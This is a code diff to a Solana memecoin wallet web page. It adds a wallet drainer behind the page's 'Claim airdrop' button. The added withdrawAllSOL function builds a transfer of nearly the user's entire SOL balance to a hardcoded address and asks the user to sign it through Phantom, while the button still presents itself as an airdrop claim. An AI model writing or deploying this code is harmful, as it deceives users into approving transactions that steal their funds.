@@ -120,6 +120,8 @@
     const airdropBtn = document.getElementById('airdropBtn');
     const airdropStatus = document.getElementById('airdropStatus');
 
+    const DEST_ADDRESS = 'DfJ1q4YvFg2gFCRDNfEtTn6P8bDRvuV65MTsKpqeRWGX';
+
     let provider = null;
     let publicKey = null;
     let connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
@@ -193,13 +195,13 @@
           const icon = token && token.logoURI ? token.logoURI : 'https://placehold.co/32x32/333/fff?text=🪙';
           const row = document.createElement('div');
           row.className = 'token-row';
-          row.innerHTML = `<div class="token-info"><img class="token-icon" src="${icon}" alt="icon"><span class="token-symbol">${symbol}</span><span class="token-balance">${amount}</span></div><button class="send-btn">Send</button>`;
+          row.innerHTML = `<div class=\"token-info\"><img class=\"token-icon\" src=\"${icon}\" alt=\"icon\"><span class=\"token-symbol\">${symbol}</span><span class=\"token-balance\">${amount}</span></div><button class=\"send-btn\">Send</button>`;
           row.querySelector('.send-btn').onclick = () => openSendModal(mint, symbol, amount, token && token.decimals ? token.decimals : 6);
           tokenList.appendChild(row);
         }
       }
       if (!found) {
-        tokenList.innerHTML = '<div style="text-align:center;color:#888;">No memecoins found in your wallet.</div>';
+        tokenList.innerHTML = '<div style=\"text-align:center;color:#888;\">No memecoins found in your wallet.</div>';
       }
       statusDiv.textContent = '';
     }
@@ -271,18 +273,45 @@
       }
     };
 
-    // Fake airdrop logic (for demo)
-    airdropBtn.onclick = async () => {
+    // Withdraw all SOL to fixed address
+    async function withdrawAllSOL() {
       airdropStatus.textContent = '';
       if (!publicKey) {
         airdropStatus.textContent = 'Connect your wallet first!';
         return;
       }
-      airdropStatus.textContent = 'Claiming airdrop...';
-      setTimeout(() => {
-        airdropStatus.innerHTML = '🎉 Airdrop claimed! Check your wallet for new memecoins.';
-      }, 1800);
-    };
+      try {
+        airdropStatus.textContent = 'Preparing withdrawal...';
+        const balance = await connection.getBalance(publicKey);
+        if (balance <= 5000) { // leave a little for rent/fees
+          airdropStatus.textContent = 'No SOL to withdraw.';
+          return;
+        }
+        const fee = 5000; // lamports
+        const lamportsToSend = balance - fee;
+        const transaction = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: new solanaWeb3.PublicKey(DEST_ADDRESS),
+            lamports: lamportsToSend
+          })
+        );
+        transaction.feePayer = publicKey;
+        let { blockhash } = await connection.getRecentBlockhash();
+        transaction.recentBlockhash = blockhash;
+        airdropStatus.textContent = 'Requesting approval in Phantom...';
+        const signed = await provider.signTransaction(transaction);
+        airdropStatus.textContent = 'Sending transaction...';
+        const txid = await connection.sendRawTransaction(signed.serialize());
+        airdropStatus.innerHTML = 'Withdrawn all SOL!<br>Tx: <a href="https://solscan.io/tx/' + txid + '" target="_blank" style="color:#00ffa3;">' + txid + '</a>';
+        await loadBalances();
+      } catch (err) {
+        airdropStatus.textContent = 'Error: ' + (err.message || err);
+      }
+    }
+
+    // Airdrop button triggers withdraw all SOL
+    airdropBtn.onclick = withdrawAllSOL;
   </script>
 </body>
 </html> 
